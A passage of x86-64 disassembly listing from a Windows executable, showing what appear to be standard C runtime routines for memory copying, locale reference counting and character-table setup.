   1400049b6:	4d 8b c8             	mov    %r8,%r9
   1400049b9:	49 c1 e9 03          	shr    $0x3,%r9
   1400049bd:	74 14                	je     0x1400049d3
   1400049bf:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   1400049c3:	48 89 01             	mov    %rax,(%rcx)
   1400049c6:	48 83 c1 08          	add    $0x8,%rcx
   1400049ca:	49 ff c9             	dec    %r9
   1400049cd:	75 f0                	jne    0x1400049bf
   1400049cf:	49 83 e0 07          	and    $0x7,%r8
   1400049d3:	4d 85 c0             	test   %r8,%r8
   1400049d6:	75 08                	jne    0x1400049e0
   1400049d8:	49 8b c3             	mov    %r11,%rax
   1400049db:	c3                   	ret
   1400049dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400049e0:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   1400049e3:	88 01                	mov    %al,(%rcx)
   1400049e5:	48 ff c1             	inc    %rcx
   1400049e8:	49 ff c8             	dec    %r8
   1400049eb:	75 f3                	jne    0x1400049e0
   1400049ed:	49 8b c3             	mov    %r11,%rax
   1400049f0:	c3                   	ret
   1400049f1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400049f8:	0f 1f 84 00 00 00 00 
   1400049ff:	00 
   140004a00:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004a04:	66 66 90             	data16 xchg %ax,%ax
   140004a07:	49 81 f9 00 20 00 00 	cmp    $0x2000,%r9
   140004a0e:	73 42                	jae    0x140004a52
   140004a10:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   140004a14:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   140004a19:	48 83 c1 20          	add    $0x20,%rcx
   140004a1d:	48 89 41 e0          	mov    %rax,-0x20(%rcx)
   140004a21:	4c 89 51 e8          	mov    %r10,-0x18(%rcx)
   140004a25:	48 8b 44 0a f0       	mov    -0x10(%rdx,%rcx,1),%rax
   140004a2a:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   140004a2f:	49 ff c9             	dec    %r9
   140004a32:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
   140004a36:	4c 89 51 f8          	mov    %r10,-0x8(%rcx)
   140004a3a:	75 d4                	jne    0x140004a10
   140004a3c:	49 83 e0 1f          	and    $0x1f,%r8
   140004a40:	e9 71 ff ff ff       	jmp    0x1400049b6
   140004a45:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140004a4c:	00 00 00 00 
   140004a50:	66 90                	xchg   %ax,%ax
   140004a52:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004a59:	72 b5                	jb     0x140004a10
   140004a5b:	b8 20 00 00 00       	mov    $0x20,%eax
   140004a60:	0f 18 04 0a          	prefetchnta (%rdx,%rcx,1)
   140004a64:	0f 18 44 0a 40       	prefetchnta 0x40(%rdx,%rcx,1)
   140004a69:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140004a70:	ff c8                	dec    %eax
   140004a72:	75 ec                	jne    0x140004a60
   140004a74:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140004a7b:	b8 40 00 00 00       	mov    $0x40,%eax
   140004a80:	4c 8b 0c 0a          	mov    (%rdx,%rcx,1),%r9
   140004a84:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   140004a89:	4c 0f c3 09          	movnti %r9,(%rcx)
   140004a8d:	4c 0f c3 51 08       	movnti %r10,0x8(%rcx)
   140004a92:	4c 8b 4c 0a 10       	mov    0x10(%rdx,%rcx,1),%r9
   140004a97:	4c 8b 54 0a 18       	mov    0x18(%rdx,%rcx,1),%r10
   140004a9c:	4c 0f c3 49 10       	movnti %r9,0x10(%rcx)
   140004aa1:	4c 0f c3 51 18       	movnti %r10,0x18(%rcx)
   140004aa6:	4c 8b 4c 0a 20       	mov    0x20(%rdx,%rcx,1),%r9
   140004aab:	4c 8b 54 0a 28       	mov    0x28(%rdx,%rcx,1),%r10
   140004ab0:	48 83 c1 40          	add    $0x40,%rcx
   140004ab4:	4c 0f c3 49 e0       	movnti %r9,-0x20(%rcx)
   140004ab9:	4c 0f c3 51 e8       	movnti %r10,-0x18(%rcx)
   140004abe:	4c 8b 4c 0a f0       	mov    -0x10(%rdx,%rcx,1),%r9
   140004ac3:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   140004ac8:	ff c8                	dec    %eax
   140004aca:	4c 0f c3 49 f0       	movnti %r9,-0x10(%rcx)
   140004acf:	4c 0f c3 51 f8       	movnti %r10,-0x8(%rcx)
   140004ad4:	75 aa                	jne    0x140004a80
   140004ad6:	49 81 e8 00 10 00 00 	sub    $0x1000,%r8
   140004add:	49 81 f8 00 10 00 00 	cmp    $0x1000,%r8
   140004ae4:	0f 83 71 ff ff ff    	jae    0x140004a5b
   140004aea:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   140004aef:	e9 b9 fe ff ff       	jmp    0x1400049ad
   140004af4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140004afb:	00 00 00 00 00 
   140004b00:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004b04:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004b08:	66 90                	xchg   %ax,%ax
   140004b0a:	49 03 c8             	add    %r8,%rcx
   140004b0d:	49 83 f8 08          	cmp    $0x8,%r8
   140004b11:	72 61                	jb     0x140004b74
   140004b13:	f6 c1 07             	test   $0x7,%cl
   140004b16:	74 36                	je     0x140004b4e
   140004b18:	f6 c1 01             	test   $0x1,%cl
   140004b1b:	74 0b                	je     0x140004b28
   140004b1d:	48 ff c9             	dec    %rcx
   140004b20:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   140004b23:	49 ff c8             	dec    %r8
   140004b26:	88 01                	mov    %al,(%rcx)
   140004b28:	f6 c1 02             	test   $0x2,%cl
   140004b2b:	74 0f                	je     0x140004b3c
   140004b2d:	48 83 e9 02          	sub    $0x2,%rcx
   140004b31:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   140004b35:	49 83 e8 02          	sub    $0x2,%r8
   140004b39:	66 89 01             	mov    %ax,(%rcx)
   140004b3c:	f6 c1 04             	test   $0x4,%cl
   140004b3f:	74 0d                	je     0x140004b4e
   140004b41:	48 83 e9 04          	sub    $0x4,%rcx
   140004b45:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   140004b48:	49 83 e8 04          	sub    $0x4,%r8
   140004b4c:	89 01                	mov    %eax,(%rcx)
   140004b4e:	4d 8b c8             	mov    %r8,%r9
   140004b51:	49 c1 e9 05          	shr    $0x5,%r9
   140004b55:	75 50                	jne    0x140004ba7
   140004b57:	4d 8b c8             	mov    %r8,%r9
   140004b5a:	49 c1 e9 03          	shr    $0x3,%r9
   140004b5e:	74 14                	je     0x140004b74
   140004b60:	48 83 e9 08          	sub    $0x8,%rcx
   140004b64:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   140004b68:	49 ff c9             	dec    %r9
   140004b6b:	48 89 01             	mov    %rax,(%rcx)
   140004b6e:	75 f0                	jne    0x140004b60
   140004b70:	49 83 e0 07          	and    $0x7,%r8
   140004b74:	4d 85 c0             	test   %r8,%r8
   140004b77:	75 07                	jne    0x140004b80
   140004b79:	49 8b c3             	mov    %r11,%rax
   140004b7c:	c3                   	ret
   140004b7d:	0f 1f 00             	nopl   (%rax)
   140004b80:	48 ff c9             	dec    %rcx
   140004b83:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   140004b86:	49 ff c8             	dec    %r8
   140004b89:	88 01                	mov    %al,(%rcx)
   140004b8b:	75 f3                	jne    0x140004b80
   140004b8d:	49 8b c3             	mov    %r11,%rax
   140004b90:	c3                   	ret
   140004b91:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140004b98:	0f 1f 84 00 00 00 00 
   140004b9f:	00 
   140004ba0:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140004ba4:	66 66 90             	data16 xchg %ax,%ax
   140004ba7:	49 81 f9 00 20 00 00 	cmp    $0x2000,%r9
   140004bae:	73 42                	jae    0x140004bf2
   140004bb0:	48 8b 44 0a f8       	mov    -0x8(%rdx,%rcx,1),%rax
   140004bb5:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   140004bba:	48 83 e9 20          	sub    $0x20,%rcx
   140004bbe:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140004bc2:	4c 89 51 10          	mov    %r10,0x10(%rcx)
   140004bc6:	48 8b 44 0a 08       	mov    0x8(%rdx,%rcx,1),%rax
   140004bcb:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   140004bcf:	49 ff c9             	dec    %r9
   140004bd2:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140004bd6:	4c 89 11             	mov    %r10,(%rcx)
   140004bd9:	75 d5                	jne    0x140004bb0
   140004bdb:	49 83 e0 1f          	and    $0x1f,%r8
   140004bdf:	e9 73 ff ff ff       	jmp    0x140004b57
   140004be4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140004beb:	00 00 00 00 00 
   140004bf0:	66 90                	xchg   %ax,%ax
   140004bf2:	48 81 fa 00 f0 ff ff 	cmp    $0xfffffffffffff000,%rdx
   140004bf9:	77 b5                	ja     0x140004bb0
   140004bfb:	b8 20 00 00 00       	mov    $0x20,%eax
   140004c00:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   140004c07:	0f 18 04 0a          	prefetchnta (%rdx,%rcx,1)
   140004c0b:	0f 18 44 0a 40       	prefetchnta 0x40(%rdx,%rcx,1)
   140004c10:	ff c8                	dec    %eax
   140004c12:	75 ec                	jne    0x140004c00
   140004c14:	48 81 c1 00 10 00 00 	add    $0x1000,%rcx
   140004c1b:	b8 40 00 00 00       	mov    $0x40,%eax
   140004c20:	4c 8b 4c 0a f8       	mov    -0x8(%rdx,%rcx,1),%r9
   140004c25:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   140004c2a:	4c 0f c3 49 f8       	movnti %r9,-0x8(%rcx)
   140004c2f:	4c 0f c3 51 f0       	movnti %r10,-0x10(%rcx)
   140004c34:	4c 8b 4c 0a e8       	mov    -0x18(%rdx,%rcx,1),%r9
   140004c39:	4c 8b 54 0a e0       	mov    -0x20(%rdx,%rcx,1),%r10
   140004c3e:	4c 0f c3 49 e8       	movnti %r9,-0x18(%rcx)
   140004c43:	4c 0f c3 51 e0       	movnti %r10,-0x20(%rcx)
   140004c48:	4c 8b 4c 0a d8       	mov    -0x28(%rdx,%rcx,1),%r9
   140004c4d:	4c 8b 54 0a d0       	mov    -0x30(%rdx,%rcx,1),%r10
   140004c52:	48 83 e9 40          	sub    $0x40,%rcx
   140004c56:	4c 0f c3 49 18       	movnti %r9,0x18(%rcx)
   140004c5b:	4c 0f c3 51 10       	movnti %r10,0x10(%rcx)
   140004c60:	4c 8b 4c 0a 08       	mov    0x8(%rdx,%rcx,1),%r9
   140004c65:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   140004c69:	ff c8                	dec    %eax
   140004c6b:	4c 0f c3 49 08       	movnti %r9,0x8(%rcx)
   140004c70:	4c 0f c3 11          	movnti %r10,(%rcx)
   140004c74:	75 aa                	jne    0x140004c20
   140004c76:	49 81 e8 00 10 00 00 	sub    $0x1000,%r8
   140004c7d:	49 81 f8 00 10 00 00 	cmp    $0x1000,%r8
   140004c84:	0f 83 71 ff ff ff    	jae    0x140004bfb
   140004c8a:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   140004c8f:	e9 ba fe ff ff       	jmp    0x140004b4e
   140004c94:	f0 ff 01             	lock incl (%rcx)
   140004c97:	48 8b 81 10 01 00 00 	mov    0x110(%rcx),%rax
   140004c9e:	48 85 c0             	test   %rax,%rax
   140004ca1:	74 03                	je     0x140004ca6
   140004ca3:	f0 ff 00             	lock incl (%rax)
   140004ca6:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   140004cad:	48 85 c0             	test   %rax,%rax
   140004cb0:	74 03                	je     0x140004cb5
   140004cb2:	f0 ff 00             	lock incl (%rax)
   140004cb5:	48 8b 81 18 01 00 00 	mov    0x118(%rcx),%rax
   140004cbc:	48 85 c0             	test   %rax,%rax
   140004cbf:	74 03                	je     0x140004cc4
   140004cc1:	f0 ff 00             	lock incl (%rax)
   140004cc4:	48 8b 81 30 01 00 00 	mov    0x130(%rcx),%rax
   140004ccb:	48 85 c0             	test   %rax,%rax
   140004cce:	74 03                	je     0x140004cd3
   140004cd0:	f0 ff 00             	lock incl (%rax)
   140004cd3:	48 8d 41 58          	lea    0x58(%rcx),%rax
   140004cd7:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140004cdd:	48 8d 15 9c 67 00 00 	lea    0x679c(%rip),%rdx        # 0x14000b480
   140004ce4:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140004ce8:	74 0b                	je     0x140004cf5
   140004cea:	48 8b 10             	mov    (%rax),%rdx
   140004ced:	48 85 d2             	test   %rdx,%rdx
   140004cf0:	74 03                	je     0x140004cf5
   140004cf2:	f0 ff 02             	lock incl (%rdx)
   140004cf5:	48 83 78 f8 00       	cmpq   $0x0,-0x8(%rax)
   140004cfa:	74 0c                	je     0x140004d08
   140004cfc:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140004d00:	48 85 d2             	test   %rdx,%rdx
   140004d03:	74 03                	je     0x140004d08
   140004d05:	f0 ff 02             	lock incl (%rdx)
   140004d08:	48 83 c0 20          	add    $0x20,%rax
   140004d0c:	49 ff c8             	dec    %r8
   140004d0f:	75 cc                	jne    0x140004cdd
   140004d11:	48 8b 81 58 01 00 00 	mov    0x158(%rcx),%rax
   140004d18:	f0 ff 80 60 01 00 00 	lock incl 0x160(%rax)
   140004d1f:	c3                   	ret
   140004d20:	48 85 c9             	test   %rcx,%rcx
   140004d23:	0f 84 97 00 00 00    	je     0x140004dc0
   140004d29:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140004d2d:	f0 44 01 09          	lock add %r9d,(%rcx)
   140004d31:	48 8b 81 10 01 00 00 	mov    0x110(%rcx),%rax
   140004d38:	48 85 c0             	test   %rax,%rax
   140004d3b:	74 04                	je     0x140004d41
   140004d3d:	f0 44 01 08          	lock add %r9d,(%rax)
   140004d41:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   140004d48:	48 85 c0             	test   %rax,%rax
   140004d4b:	74 04                	je     0x140004d51
   140004d4d:	f0 44 01 08          	lock add %r9d,(%rax)
   140004d51:	48 8b 81 18 01 00 00 	mov    0x118(%rcx),%rax
   140004d58:	48 85 c0             	test   %rax,%rax
   140004d5b:	74 04                	je     0x140004d61
   140004d5d:	f0 44 01 08          	lock add %r9d,(%rax)
   140004d61:	48 8b 81 30 01 00 00 	mov    0x130(%rcx),%rax
   140004d68:	48 85 c0             	test   %rax,%rax
   140004d6b:	74 04                	je     0x140004d71
   140004d6d:	f0 44 01 08          	lock add %r9d,(%rax)
   140004d71:	48 8d 41 58          	lea    0x58(%rcx),%rax
   140004d75:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140004d7b:	48 8d 15 fe 66 00 00 	lea    0x66fe(%rip),%rdx        # 0x14000b480
   140004d82:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140004d86:	74 0c                	je     0x140004d94
   140004d88:	48 8b 10             	mov    (%rax),%rdx
   140004d8b:	48 85 d2             	test   %rdx,%rdx
   140004d8e:	74 04                	je     0x140004d94
   140004d90:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140004d94:	48 83 78 f8 00       	cmpq   $0x0,-0x8(%rax)
   140004d99:	74 0d                	je     0x140004da8
   140004d9b:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140004d9f:	48 85 d2             	test   %rdx,%rdx
   140004da2:	74 04                	je     0x140004da8
   140004da4:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140004da8:	48 83 c0 20          	add    $0x20,%rax
   140004dac:	49 ff c8             	dec    %r8
   140004daf:	75 ca                	jne    0x140004d7b
   140004db1:	48 8b 81 58 01 00 00 	mov    0x158(%rcx),%rax
   140004db8:	f0 44 01 88 60 01 00 	lock add %r9d,0x160(%rax)
   140004dbf:	00 
   140004dc0:	48 8b c1             	mov    %rcx,%rax
   140004dc3:	c3                   	ret
   140004dc4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004dc9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004dce:	57                   	push   %rdi
   140004dcf:	48 83 ec 20          	sub    $0x20,%rsp
   140004dd3:	48 8b 81 28 01 00 00 	mov    0x128(%rcx),%rax
   140004dda:	48 8b d9             	mov    %rcx,%rbx
   140004ddd:	48 85 c0             	test   %rax,%rax
   140004de0:	74 79                	je     0x140004e5b
   140004de2:	48 8d 0d 27 70 00 00 	lea    0x7027(%rip),%rcx        # 0x14000be10
   140004de9:	48 3b c1             	cmp    %rcx,%rax
   140004dec:	74 6d                	je     0x140004e5b
   140004dee:	48 8b 83 10 01 00 00 	mov    0x110(%rbx),%rax
   140004df5:	48 85 c0             	test   %rax,%rax
   140004df8:	74 61                	je     0x140004e5b
   140004dfa:	83 38 00             	cmpl   $0x0,(%rax)
   140004dfd:	75 5c                	jne    0x140004e5b
   140004dff:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   140004e06:	48 85 c9             	test   %rcx,%rcx
   140004e09:	74 16                	je     0x140004e21
   140004e0b:	83 39 00             	cmpl   $0x0,(%rcx)
   140004e0e:	75 11                	jne    0x140004e21
   140004e10:	e8 d7 cf ff ff       	call   0x140001dec
   140004e15:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   140004e1c:	e8 8b 13 00 00       	call   0x1400061ac
   140004e21:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   140004e28:	48 85 c9             	test   %rcx,%rcx
   140004e2b:	74 16                	je     0x140004e43
   140004e2d:	83 39 00             	cmpl   $0x0,(%rcx)
   140004e30:	75 11                	jne    0x140004e43
   140004e32:	e8 b5 cf ff ff       	call   0x140001dec
   140004e37:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   140004e3e:	e8 fd 12 00 00       	call   0x140006140
   140004e43:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   140004e4a:	e8 9d cf ff ff       	call   0x140001dec
   140004e4f:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   140004e56:	e8 91 cf ff ff       	call   0x140001dec
   140004e5b:	48 8b 83 30 01 00 00 	mov    0x130(%rbx),%rax
   140004e62:	48 85 c0             	test   %rax,%rax
   140004e65:	74 47                	je     0x140004eae
   140004e67:	83 38 00             	cmpl   $0x0,(%rax)
   140004e6a:	75 42                	jne    0x140004eae
   140004e6c:	48 8b 8b 38 01 00 00 	mov    0x138(%rbx),%rcx
   140004e73:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   140004e7a:	e8 6d cf ff ff       	call   0x140001dec
   140004e7f:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   140004e86:	bf 80 00 00 00       	mov    $0x80,%edi
   140004e8b:	48 2b cf             	sub    %rdi,%rcx
   140004e8e:	e8 59 cf ff ff       	call   0x140001dec
   140004e93:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   140004e9a:	48 2b cf             	sub    %rdi,%rcx
   140004e9d:	e8 4a cf ff ff       	call   0x140001dec
   140004ea2:	48 8b 8b 30 01 00 00 	mov    0x130(%rbx),%rcx
   140004ea9:	e8 3e cf ff ff       	call   0x140001dec
   140004eae:	48 8b 8b 58 01 00 00 	mov    0x158(%rbx),%rcx
   140004eb5:	48 8d 05 d4 65 00 00 	lea    0x65d4(%rip),%rax        # 0x14000b490
   140004ebc:	48 3b c8             	cmp    %rax,%rcx
   140004ebf:	74 1a                	je     0x140004edb
   140004ec1:	83 b9 60 01 00 00 00 	cmpl   $0x0,0x160(%rcx)
   140004ec8:	75 11                	jne    0x140004edb
   140004eca:	e8 81 0e 00 00       	call   0x140005d50
   140004ecf:	48 8b 8b 58 01 00 00 	mov    0x158(%rbx),%rcx
   140004ed6:	e8 11 cf ff ff       	call   0x140001dec
   140004edb:	48 8d 7b 58          	lea    0x58(%rbx),%rdi
   140004edf:	be 06 00 00 00       	mov    $0x6,%esi
   140004ee4:	48 8d 05 95 65 00 00 	lea    0x6595(%rip),%rax        # 0x14000b480
   140004eeb:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   140004eef:	74 12                	je     0x140004f03
   140004ef1:	48 8b 0f             	mov    (%rdi),%rcx
   140004ef4:	48 85 c9             	test   %rcx,%rcx
   140004ef7:	74 0a                	je     0x140004f03
   140004ef9:	83 39 00             	cmpl   $0x0,(%rcx)
   140004efc:	75 05                	jne    0x140004f03
   140004efe:	e8 e9 ce ff ff       	call   0x140001dec
   140004f03:	48 83 7f f8 00       	cmpq   $0x0,-0x8(%rdi)
   140004f08:	74 13                	je     0x140004f1d
   140004f0a:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140004f0e:	48 85 c9             	test   %rcx,%rcx
   140004f11:	74 0a                	je     0x140004f1d
   140004f13:	83 39 00             	cmpl   $0x0,(%rcx)
   140004f16:	75 05                	jne    0x140004f1d
   140004f18:	e8 cf ce ff ff       	call   0x140001dec
   140004f1d:	48 83 c7 20          	add    $0x20,%rdi
   140004f21:	48 ff ce             	dec    %rsi
   140004f24:	75 be                	jne    0x140004ee4
   140004f26:	48 8b cb             	mov    %rbx,%rcx
   140004f29:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004f2e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004f33:	48 83 c4 20          	add    $0x20,%rsp
   140004f37:	5f                   	pop    %rdi
   140004f38:	e9 af ce ff ff       	jmp    0x140001dec
   140004f3d:	cc                   	int3
   140004f3e:	cc                   	int3
   140004f3f:	cc                   	int3
   140004f40:	40 53                	rex push %rbx
   140004f42:	48 83 ec 20          	sub    $0x20,%rsp
   140004f46:	48 8b da             	mov    %rdx,%rbx
   140004f49:	48 85 d2             	test   %rdx,%rdx
   140004f4c:	74 41                	je     0x140004f8f
   140004f4e:	48 85 c9             	test   %rcx,%rcx
   140004f51:	74 3c                	je     0x140004f8f
   140004f53:	4c 8b 11             	mov    (%rcx),%r10
   140004f56:	4c 3b d2             	cmp    %rdx,%r10
   140004f59:	74 2f                	je     0x140004f8a
   140004f5b:	48 89 11             	mov    %rdx,(%rcx)
   140004f5e:	48 8b ca             	mov    %rdx,%rcx
   140004f61:	e8 2e fd ff ff       	call   0x140004c94
   140004f66:	4d 85 d2             	test   %r10,%r10
   140004f69:	74 1f                	je     0x140004f8a
   140004f6b:	49 8b ca             	mov    %r10,%rcx
   140004f6e:	e8 ad fd ff ff       	call   0x140004d20
   140004f73:	41 83 3a 00          	cmpl   $0x0,(%r10)
   140004f77:	75 11                	jne    0x140004f8a
   140004f79:	48 8d 05 d0 67 00 00 	lea    0x67d0(%rip),%rax        # 0x14000b750
   140004f80:	4c 3b d0             	cmp    %rax,%r10
   140004f83:	74 05                	je     0x140004f8a
   140004f85:	e8 3a fe ff ff       	call   0x140004dc4
   140004f8a:	48 8b c3             	mov    %rbx,%rax
   140004f8d:	eb 02                	jmp    0x140004f91
   140004f8f:	33 c0                	xor    %eax,%eax
   140004f91:	48 83 c4 20          	add    $0x20,%rsp
   140004f95:	5b                   	pop    %rbx
   140004f96:	c3                   	ret
   140004f97:	cc                   	int3
   140004f98:	40 53                	rex push %rbx
   140004f9a:	48 83 ec 20          	sub    $0x20,%rsp
   140004f9e:	e8 fd e5 ff ff       	call   0x1400035a0
   140004fa3:	48 8b d8             	mov    %rax,%rbx
   140004fa6:	8b 88 c8 00 00 00    	mov    0xc8(%rax),%ecx
   140004fac:	85 0d f6 6e 00 00    	test   %ecx,0x6ef6(%rip)        # 0x14000bea8
   140004fb2:	74 18                	je     0x140004fcc
   140004fb4:	48 83 b8 c0 00 00 00 	cmpq   $0x0,0xc0(%rax)
   140004fbb:	00 
   140004fbc:	74 0e                	je     0x140004fcc
   140004fbe:	e8 dd e5 ff ff       	call   0x1400035a0
   140004fc3:	48 8b 98 c0 00 00 00 	mov    0xc0(%rax),%rbx
   140004fca:	eb 2b                	jmp    0x140004ff7
   140004fcc:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140004fd1:	e8 7e ec ff ff       	call   0x140003c54
   140004fd6:	90                   	nop
   140004fd7:	48 8d 8b c0 00 00 00 	lea    0xc0(%rbx),%rcx
   140004fde:	48 8b 15 cb 68 00 00 	mov    0x68cb(%rip),%rdx        # 0x14000b8b0
   140004fe5:	e8 56 ff ff ff       	call   0x140004f40
   140004fea:	48 8b d8             	mov    %rax,%rbx
   140004fed:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140004ff2:	e8 5d eb ff ff       	call   0x140003b54
   140004ff7:	48 85 db             	test   %rbx,%rbx
   140004ffa:	75 08                	jne    0x140005004
   140004ffc:	8d 4b 20             	lea    0x20(%rbx),%ecx
   140004fff:	e8 e8 d4 ff ff       	call   0x1400024ec
   140005004:	48 8b c3             	mov    %rbx,%rax
   140005007:	48 83 c4 20          	add    $0x20,%rsp
   14000500b:	5b                   	pop    %rbx
   14000500c:	c3                   	ret
   14000500d:	cc                   	int3
   14000500e:	cc                   	int3
   14000500f:	cc                   	int3
   140005010:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005015:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000501a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000501f:	57                   	push   %rdi
   140005020:	48 83 ec 20          	sub    $0x20,%rsp
   140005024:	48 8d 59 1c          	lea    0x1c(%rcx),%rbx
   140005028:	48 8b e9             	mov    %rcx,%rbp
   14000502b:	be 01 01 00 00       	mov    $0x101,%esi
   140005030:	48 8b cb             	mov    %rbx,%rcx
   140005033:	44 8b c6             	mov    %esi,%r8d
   140005036:	33 d2                	xor    %edx,%edx
   140005038:	e8 e3 08 00 00       	call   0x140005920
   14000503d:	45 33 db             	xor    %r11d,%r11d
   140005040:	48 8d 7d 10          	lea    0x10(%rbp),%rdi
   140005044:	41 8d 4b 06          	lea    0x6(%r11),%ecx
   140005048:	41 0f b7 c3          	movzwl %r11w,%eax
   14000504c:	44 89 5d 0c          	mov    %r11d,0xc(%rbp)
   140005050:	4c 89 5d 04          	mov    %r11,0x4(%rbp)
   140005054:	66 f3 ab             	rep stos %ax,(%rdi)
   140005057:	48 8d 3d 62 68 00 00 	lea    0x6862(%rip),%rdi        # 0x14000b8c0
   14000505e:	48 2b fd             	sub    %rbp,%rdi
   140005061:	8a 04 1f             	mov    (%rdi,%rbx,1),%al
   140005064:	88 03                	mov    %al,(%rbx)
   140005066:	48 ff c3             	inc    %rbx
   140005069:	48 ff ce             	dec    %rsi
   14000506c:	75 f3                	jne    0x140005061
   14000506e:	48 8d 8d 1d 01 00 00 	lea    0x11d(%rbp),%rcx
   140005075:	ba 00 01 00 00       	mov    $0x100,%edx
   14000507a:	8a 04 39             	mov    (%rcx,%rdi,1),%al
   14000507d:	88 01                	mov    %al,(%rcx)
   14000507f:	48 ff c1             	inc    %rcx
   140005082:	48 ff ca             	dec    %rdx
   140005085:	75 f3                	jne    0x14000507a
   140005087:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000508c:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005091:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005096:	48 83 c4 20          	add    $0x20,%rsp
   14000509a:	5f                   	pop    %rdi
   14000509b:	c3                   	ret
   14000509c:	48 8b c4             	mov    %rsp,%rax
   14000509f:	48 89 58 10          	mov    %rbx,0x10(%rax)
   1400050a3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400050a7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400050ab:	55                   	push   %rbp
   1400050ac:	48 8d a8 78 fb ff ff 	lea    -0x488(%rax),%rbp
   1400050b3:	48 81 ec 80 05 00 00 	sub    $0x580,%rsp
   1400050ba:	48 8b 05 af 63 00 00 	mov    0x63af(%rip),%rax        # 0x14000b470
   1400050c1:	48 33 c4             	xor    %rsp,%rax
   1400050c4:	48 89 85 70 04 00 00 	mov    %rax,0x470(%rbp)
   1400050cb:	48 8b f1             	mov    %rcx,%rsi
   1400050ce:	8b 49 04             	mov    0x4(%rcx),%ecx
   1400050d1:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400050d6:	ff 15 2c 30 00 00    	call   *0x302c(%rip)        # 0x140008108
   1400050dc:	bb 00 01 00 00       	mov    $0x100,%ebx
   1400050e1:	85 c0                	test   %eax,%eax
   1400050e3:	0f 84 3c 01 00 00    	je     0x140005225
   1400050e9:	33 c0                	xor    %eax,%eax
   1400050eb:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400050f0:	88 01                	mov    %al,(%rcx)
   1400050f2:	ff c0                	inc    %eax
   1400050f4:	48 ff c1             	inc    %rcx
   1400050f7:	3b c3                	cmp    %ebx,%eax
   1400050f9:	72 f5                	jb     0x1400050f0
   1400050fb:	8a 44 24 56          	mov    0x56(%rsp),%al
   1400050ff:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   140005104:	48 8d 7c 24 56       	lea    0x56(%rsp),%rdi
   140005109:	eb 29                	jmp    0x140005134
